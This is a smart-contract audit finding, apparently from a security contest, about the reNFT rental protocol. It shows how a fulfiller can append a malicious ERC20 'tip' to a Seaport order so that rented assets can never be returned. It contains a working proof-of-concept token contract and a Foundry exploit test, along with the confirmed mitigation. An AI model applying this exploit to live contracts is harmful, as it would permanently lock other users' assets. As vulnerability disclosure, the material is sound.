[H-01] All orders can be hijacked to lock rental assets forever by tipping a malicious ERC20
Submitted byEV_om, also found by0xDING99YA
TheCreatecontract is responsible for creating a rental. It achieves this by acting as a SeaportZone, and storing and validating orders as rentals when they are fulfilled on Seaport.
However, one thing it doesn’t account for is the fact that Seaport allows for “tipping” in the form of ERC20 tokens as part of the order fulfillment process. This is done by extending theconsiderationarray in the order with additional ERC20 tokens.
From the Seaportdocs(emphasis mine):
Theconsiderationcontains an array of items that must be received in order to fulfill the order. It contains all of the same components as an offered item, and additionally includes arecipientthat will receive each item. This arraymay be extended by the fulfiller on order fulfillment so as to support “tipping”(e.g. relayer or referral payments).
This other passage, while discussing a different issue, even highlights the root cause of this vulnerability (the zone does not properly allocate consideration extensions):
As extensions to the consideration array on fulfillment (i.e. “tipping”) can be arbitrarily set by the caller, fulfillments where all matched orders have already been signed for or validated can be frontrun on submission, with the frontrunner modifying any tips. Therefore, it is important that orders fulfilled in this manner either leverage “restricted” order types with azone that enforces appropriate allocation of consideration extensions, or that each offer item is fully spent and each consideration item is appropriately declared on order creation.
Let’s dive in and see how tipping works exactly. We know fulfillers may use the entry points listedhere, the first of which is simply a wrapper to_validateAndFulfillAdvancedOrder(). This function calls_validateOrderAndUpdateStatus(), which derives the order hash by calling_assertConsiderationLengthAndGetOrderHash(). At the end of the trail, we can see that the order hash is finally derived in_deriveOrderHash()from other order parameters as well as the consideration array, butonly up tothetotalOriginalConsiderationItemsvalue in theparametersof theAdvancedOrderpassed by the fulfiller as argument. This value reflects the original length of the consideration items in the order.https://github.com/ProjectOpenSea/seaport-types/blob/25bae8ddfa8709e5c51ab429fe06024e46a18f15/src/lib/ConsiderationStructs.sol#L143-L156
structOrderParameters{addressofferer;// 0x00addresszone;// 0x20OfferItem[]offer;// 0x40ConsiderationItem[]consideration;// 0x60OrderTypeorderType;// 0x80uint256startTime;// 0xa0uint256endTime;// 0xc0bytes32zoneHash;// 0xe0uint256salt;// 0x100bytes32conduitKey;// 0x120uint256totalOriginalConsiderationItems;// 0x140// offer.length                          // 0x160}
Thus we can see that when deriving the order hash the extra consideration items are ignored, which is what allows the original signature of the offerer to match. However, in theZoneParameterspassed on to the zone, all consideration items are included in one array, and there is no obvious way to distinguish tips from original items:
structZoneParameters{bytes32orderHash;addressfulfiller;addressofferer;SpentItem[]offer;ReceivedItem[]consideration;// the next struct member is only available in the project's forkReceivedItem[]totalExecutions;bytesextraData;bytes32[]orderHashes;uint256startTime;uint256endTime;bytes32zoneHash;}
Finally, while thevalidateOrder()function in theCreatecontract verifies that the order fulfillment has been signed by the reNFT signer, the signedRentPayloaddoes not depend on the consideration items, hence tipping is still possible.
The vulnerability arises when this capability is exploited to add a malicious ERC20 token to theconsiderationarray. This malicious token can be designed to revert on transfer, causing the rental stop process to fail. As a result, the rented assets remain locked in the rental safe indefinitely.
Proof of Concept
We can validate the vulnerability through an additional test case for theRent.t.soltest file. This test case will simulate the exploit scenario and confirm the issue by performing the following actions:
Create aBASEorder with Alice as the offerer.Finalize the order creation.Create an order fulfillment with Bob as the fulfiller.Append a malicious ERC20 token to theconsiderationarray of the order.Finalize the order fulfillment.Attempt to stop the rent, which will fail due to the revert on transfer from the escrow.
A simple exploit contract could look as follows:
pragmasolidity^0.8.20;import{ERC20}from"@openzeppelin-contracts/token/ERC20/ERC20.sol";// This mock ERC20 will always revert on `transfer`contractMockRevertOnTransferERC20isERC20{constructor()ERC20("MockAlwaysRevertERC20","M_AR_ERC20") {}functionmint(addressto,uint256amount)public{_mint(to,amount);}functionburn(addressto,uint256amount)public{_burn(to,amount);}functiontransfer(address,uint256)publicpureoverridereturns(bool) {require(false,"transfer() revert");returnfalse;}}
And the test:
import{Order,OrderParameters,ConsiderationItem,ItemType,FulfillmentComponent,Fulfillment,ItemTypeasSeaportItemType}from"@seaport-types/lib/ConsiderationStructs.sol";import{MockRevertOnTransferERC20}from"@test/mocks/tokens/weird/MockRevertOnTransferERC20.sol";functiontest_Vuln_OrderHijackingByTippingMaliciousERC20()public{// create a BASE ordercreateOrder({offerer:alice,orderType:OrderType.BASE,erc721Offers:1,erc1155Offers:0,erc20Offers:0,erc721Considerations:0,erc1155Considerations:0,erc20Considerations:1});// finalize the order creation(Ordermemoryorder,bytes32orderHash,OrderMetadatamemorymetadata) =finalizeOrder();// create an order fulfillmentcreateOrderFulfillment({_fulfiller:bob,order:order,orderHash:orderHash,metadata:metadata});// ------- Identical to existing "test_Success_Rent_BaseOrder_ERC721" until here -------MockRevertOnTransferERC20exploitErc20=newMockRevertOnTransferERC20();// Seaport enforces non-zero quantities + approvalsexploitErc20.mint(bob.addr,100);vm.prank(bob.addr);exploitErc20.approve(address(conduit),type(uint256).max);// we acccess baseOrder.advancedOrder and add a consideration itemOrderParametersstorageparams=ordersToFulfill[0].advancedOrder.parameters;params.consideration.push(ConsiderationItem({itemType:ItemType.ERC20,token:address(exploitErc20),identifierOrCriteria:0,startAmount:100,endAmount:100,recipient:payable(address(ESCRW))}));// finalize the base order fulfillmentRentalOrdermemoryrentalOrder=finalizeBaseOrderFulfillment();// speed up in time past the rental expirationvm.warp(block.timestamp+750);// rental cannot be stopped since transfer from escrow will always revertvm.prank(bob.addr);vm.expectRevert(abi.encodeWithSelector(Errors.PaymentEscrowModule_PaymentTransferFailed.selector,exploitErc20,alice.addr,100));stop.stopRent(rentalOrder);}
To run the exploit test:
Save the exploit contract astest/mocks/tokens/weird/MockRevertOnTransferERC20.sol.Add the test to theRent.t.soltest file and run it using the commandforge test --mt test_Vuln_OrderHijackingByTippingMaliciousERC20. This will run the test above, which should demonstrate the exploit by successfully appending a malicious ERC20 to an existing order and starting a rental that cannot be stopped.
Tools Used
Foundry
Recommended Mitigation Steps
Disallow tipping, either by removing this functionality in the Seaport fork or, if this isn’t possible, perhaps by adding the size of the consideration items to theZoneParametersand reverting if there are more. This would prevent the addition of malicious ERC20 tokens to theconsiderationarray, thereby preventing the hijacking of orders and the indefinite locking of rented assets in the rental safe.
Alec1017 (reNFT) confirmed
reNFT mitigated:
The PRhere- Implements a whitelist so only granted assets can be used in the protocol.The PRhere- Implements batching functionality for whitelisting tokens so that multiple can be added at once.
Status:Mitigation confirmed. Full details in reports fromjuancito,EV_omandsin1st3r__.